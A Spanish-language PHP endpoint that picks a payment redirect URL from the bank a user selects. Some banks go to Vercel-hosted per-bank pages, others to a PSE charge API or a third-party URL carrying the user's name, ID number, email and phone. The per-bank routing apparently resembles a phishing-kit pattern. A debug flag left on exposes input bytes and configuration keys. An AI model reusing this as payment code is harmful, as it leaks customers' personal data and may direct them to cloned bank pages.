<?php
/**
 * Calcula la URL de destino del pago según el banco elegido.
 *
 * - Si el banco está en 'primary_banks' → Vercel con su slug + id
 * - Si NO está en 'primary_banks' → recaudofall con sus datos en query string
 *
 * Acepta POST con JSON: { tipoEntidad, banco, nombre, cedula, email, telefono, monto }
 * Devuelve JSON: { ok, url, banco } o { ok:false, error }
 */
declare(strict_types=1);

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

// ---------------------------------------------------------------
// DEBUG: pon en true para ver exactamente qué bytes llegan
// ---------------------------------------------------------------
const DEBUG_BANCO = true;

// ---------------------------------------------------------------
// 1. Validar método
// ---------------------------------------------------------------
if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'method_not_allowed']);
    exit;
}

// ---------------------------------------------------------------
// 2. Cargar configuración
// ---------------------------------------------------------------
$configPath = __DIR__ . '/pse-config.php';
if (!is_file($configPath)) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'config_no_encontrada']);
    exit;
}
require_once __DIR__ . '/config.php';
$config = require $configPath;

// ---------------------------------------------------------------
// 3. Leer payload JSON
// ---------------------------------------------------------------
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'bad_json']);
    exit;
}

// ---------------------------------------------------------------
// 4. Helpers
// ---------------------------------------------------------------
$limpiar = static function ($v, int $max = 200): string {
    $v = is_scalar($v) ? (string) $v : '';
    $v = trim(preg_replace('/[\x00-\x1F\x7F]/u', '', $v) ?? '');
    return mb_substr($v, 0, $max);
};

/**
 * Normaliza un nombre de banco a su clave interna.
 * Maneja UTF-8, ISO-8859-1 y Windows-1252, y quita tildes.
 */
$normalizar = static function (string $texto, array $aliases): string {

    // --- 1. Detectar codificación real y convertir a UTF-8 ---
    if ($texto === '')
        return '';

    $enc = mb_detect_encoding($texto, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true);
    if ($enc && $enc !== 'UTF-8') {
        $texto = mb_convert_encoding($texto, 'UTF-8', $enc);
    }

    // --- 2. A mayúsculas (multibyte) ---
    $texto = mb_strtoupper($texto, 'UTF-8');

    // --- 3. Quitar tildes / diacríticos ---
    $mapa = [
        'Á' => 'A',
        'À' => 'A',
        'Ä' => 'A',
        'Â' => 'A',
        'Ã' => 'A',
        'Å' => 'A',
        'É' => 'E',
        'È' => 'E',
        'Ë' => 'E',
        'Ê' => 'E',
        'Í' => 'I',
        'Ì' => 'I',
        'Ï' => 'I',
        'Î' => 'I',
        'Ó' => 'O',
        'Ò' => 'O',
        'Ö' => 'O',
        'Ô' => 'O',
        'Õ' => 'O',
        'Ú' => 'U',
        'Ù' => 'U',
        'Ü' => 'U',
        'Û' => 'U',
        'Ñ' => 'N',
        'Ç' => 'C',
        'Ý' => 'Y',
    ];
    $texto = strtr($texto, $mapa);

    // --- 4. Limpiar todo lo que no sea A-Z, 0-9 o espacio ---
    $texto = preg_replace('/[^A-Z0-9 ]+/', ' ', $texto);
    $texto = trim(preg_replace('/\s+/', ' ', $texto));

    // --- 5. Buscar en aliases ---
    if (isset($aliases[$texto])) {
        return $aliases[$texto];
    }

    // --- 6. Fallback: slug con guiones ---
    $slug = strtolower(preg_replace('/[^A-Z0-9]+/', '-', $texto));
    return trim($slug, '-');
};

// ---------------------------------------------------------------
// 5. Extraer y sanitizar entrada
// ---------------------------------------------------------------
$bancoRaw     = $limpiar($data['banco']         ?? '', 120);
$nombre       = $limpiar($data['nombre']        ?? '', 150);
$cedula       = $limpiar($data['cedula']        ?? '', 30);
$tipoDocumento= $limpiar($data['tipoDocumento'] ?? 'CC', 10);
$email        = $limpiar($data['email']         ?? '', 150);
$telefono     = $limpiar($data['telefono']      ?? '', 20);
$monto        = $limpiar($data['monto']         ?? '0', 20);
$tipoEntidad  = $limpiar($data['tipoEntidad']   ?? 'aval', 20);
$referencia   = $limpiar($data['referencia']    ?? '', 80);

if ($bancoRaw === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'banco_requerido']);
    exit;
}

// ---------------------------------------------------------------
// 6. Normalizar nombre del banco a clave interna
// ---------------------------------------------------------------
$bancoClave = $normalizar($bancoRaw, $config['aliases'] ?? []);

// ---------------------------------------------------------------
// 7. DEBUG opcional
// ---------------------------------------------------------------
if (DEBUG_BANCO) {
    $bytes = [];
    for ($i = 0; $i < strlen($bancoRaw); $i++) {
        $bytes[] = sprintf('%02X', ord($bancoRaw[$i]));
    }
    echo json_encode([
        'debug' => [
            'bancoRaw' => $bancoRaw,
            'bytes' => implode(' ', $bytes),
            'encoding' => mb_detect_encoding($bancoRaw, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true),
            'bancoClave' => $bancoClave,
            'primary_keys' => array_keys($config['primary_banks'] ?? []),
            'recaudo_keys' => array_slice(array_keys($config['recaudofall_banks'] ?? []), 0, 10),
            'hp_keys' => array_slice(array_keys($config['helppiupay_bank_codes'] ?? []), 0, 10),
            'provider' => $config['pse_provider'] ?? 'no definido',
        ]
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// ---------------------------------------------------------------
// 8. Normalizar monto a entero sin separadores
// ---------------------------------------------------------------
$montoLimpio = preg_replace('/[^\d]/', '', $monto) ?: '0';

// ---------------------------------------------------------------
// 9. Decidir destino
// ---------------------------------------------------------------
$primaryBanks = $config['primary_banks'] ?? [];

if (isset($primaryBanks[$bancoClave])) {

    // -------- Redirigir a Vercel --------
    $slug = $primaryBanks[$bancoClave]['slug'];
    $id = $primaryBanks[$bancoClave]['id'];
    $url = rtrim($config['links']['primary_page'], '/') . "/sites/{$slug}/manager/{$id}";

} else {

    $provider = $config['pse_provider'] ?? 'recaudofall';

    // ──────────────────────────────────────────────────────────────
    // HelppiuPay Direct Charges (PSE)
    // ──────────────────────────────────────────────────────────────
    if ($provider === 'helppiupay') {

        $hpBankCodes = $config['helppiupay_bank_codes'] ?? [];
        $bankCode    = $hpBankCodes[$bancoClave] ?? null;

        if (!$bankCode) {
            http_response_code(400);
            echo json_encode(['ok' => false, 'error' => 'banco_no_soportado', 'banco' => $bancoClave]);
            exit;
        }

        $hp   = $config['helppiupay'] ?? [];
        $auth = ($hp['key_id'] ?? '') . ':' . ($hp['secret'] ?? '');

        // Mapear tipo de documento a los valores que acepta HelppiuPay
        $docTypeMap = ['CC' => 'CC', 'CE' => 'CE', 'NIT' => 'NIT', 'PP' => 'PP', 'TI' => 'TI'];
        $docType    = $docTypeMap[strtoupper($tipoDocumento)] ?? 'CC';
        $docNumber  = preg_replace('/[^0-9]/', '', $cedula);

        // Referencia única para la transacción
        $ref = $referencia !== '' ? ('PSE-' . $referencia) : ('PSE-' . $montoLimpio . '-' . time());

        $payload = json_encode([
            'reference'      => substr($ref, 0, 80),
            'amount'         => (int) $montoLimpio,
            'currency'       => 'COP',
            'customer'       => [
                'name'     => $nombre,
                'email'    => $email,
                'document' => $docNumber,
                'phone'    => $telefono,
            ],
            'payment_method' => [
                'type'          => 'pse',
                'bank_code'     => $bankCode,
                'person_type'   => '0',
                'document_type' => $docType,
            ],
        ]);

        $ch = curl_init('https://helppiupay.com/api/v1/charges');
        curl_setopt_array($ch, [
            CURLOPT_POST           => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POSTFIELDS     => $payload,
            CURLOPT_HTTPHEADER     => [
                'Authorization: Bearer ' . $auth,
                'Content-Type: application/json',
            ],
            CURLOPT_TIMEOUT        => 15,
            CURLOPT_SSL_VERIFYPEER => true,
        ]);

        $resp     = curl_exec($ch);
        $httpCode = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curlErr  = curl_error($ch);
        curl_close($ch);

        if ($curlErr || $resp === false) {
            http_response_code(502);
            echo json_encode(['ok' => false, 'error' => 'helppiupay_conexion']);
            exit;
        }

        $decoded = json_decode($resp, true);

        if ($httpCode !== 201 && $httpCode !== 200) {
            http_response_code(502);
            echo json_encode([
                'ok'     => false,
                'error'  => 'helppiupay_error',
                'detail' => $decoded['message'] ?? $decoded['errors'] ?? '',
            ]);
            exit;
        }

        $redirectUrl = $decoded['next_action']['redirect_url'] ?? null;
        if (!$redirectUrl) {
            http_response_code(502);
            echo json_encode(['ok' => false, 'error' => 'helppiupay_no_redirect']);
            exit;
        }

        $url = $redirectUrl;

    // ──────────────────────────────────────────────────────────────
    // Recaudofall (proveedor por defecto)
    // ──────────────────────────────────────────────────────────────
    } else {

        if (!isset($config['recaudofall_banks'][$bancoClave])) {
            http_response_code(400);
            echo json_encode([
                'ok'    => false,
                'error' => 'banco_no_soportado',
                'banco' => $bancoClave,
            ]);
            exit;
        }

        $query = http_build_query([
            'banco'    => $bancoClave,
            'monto'    => $montoLimpio,
            'email'    => $email,
            'cedula'   => $cedula,
            'nombre'   => $nombre,
            'telefono' => $telefono,
        ]);

        $base = rtrim($config['links']['recaudofall_base'], '?&');
        $sep  = (strpos($base, '?') !== false) ? '&' : '?';
        $url  = $base . $sep . $query;
    }
}

// ---------------------------------------------------------------
// 10. Responder
// ---------------------------------------------------------------
echo json_encode([
    'ok' => true,
    'url' => $url,
    'banco' => $bancoClave,
]);
